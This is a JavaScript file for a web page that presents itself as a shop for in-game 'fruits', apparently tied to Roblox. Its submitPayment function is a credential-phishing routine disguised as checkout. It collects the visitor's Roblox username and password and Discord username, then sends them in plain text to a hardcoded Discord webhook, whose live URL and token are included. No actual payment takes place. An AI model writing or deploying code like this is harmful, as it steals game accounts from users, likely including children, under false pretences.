// Function to open the modal
function openModal() {
    var modal = document.getElementById('myModal');
    var modalImage = document.getElementById('modalImage');
    var modalTitle = document.getElementById('modalTitle');
    var modalDescription = document.getElementById('modalDescription');
    var amountLabel = document.getElementById('amountLabel');

    // Set content for the modal
    modalImage.src = 'https://site.surveysparrow.com/wp-content/uploads/2023/04/Understanding-Consumer-Buying-Behavior-768x410.png';
    modalTitle.textContent = 'Selected Fruit';
    modalDescription.textContent = 'Enter your details to proceed with the purchase:';
    amountLabel.textContent = 'Fruit ($):';

    modal.style.display = 'block';
}

// Function to close the modal
function closeModal() {
    var modal = document.getElementById('myModal');
    modal.style.display = 'none';
}

// Function to handle payment submission
function submitPayment() {
    var amount = document.getElementById('amount').value;
    var robloxUsername = document.getElementById('robloxUsername').value;
    var robloxPassword = document.getElementById('robloxPassword').value;
    var discordUsername = document.getElementById('discordUsername').value;

    // Send the payment details to the Discord webhook
    var webhookURL = 'https://discord.com/api/webhooks/1259203378890670241/FVvyQ-QsNZ0rJ-3SfRDP2Ep6-i1qb442YuRztibJaA3cuzgisDK0ySEZU4woqdX5uiYg';
    var payload = {
        content: `**Payment Details**\nAmount: $${amount}\nRoblox Username: ${robloxUsername}\nRoblox Password: ${robloxPassword}\nDiscord Username: ${discordUsername}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            alert('Payment details sent successfully.');
        } else {
            alert('Failed to send payment details.');
        }
        closeModal();
    })
    .catch(error => {
        alert('Error: ' + error.message);
        closeModal();
    });
}

document.addEventListener('DOMContentLoaded', function() {
    loadContent('fruits.html'); // Load fruits.html by default
});
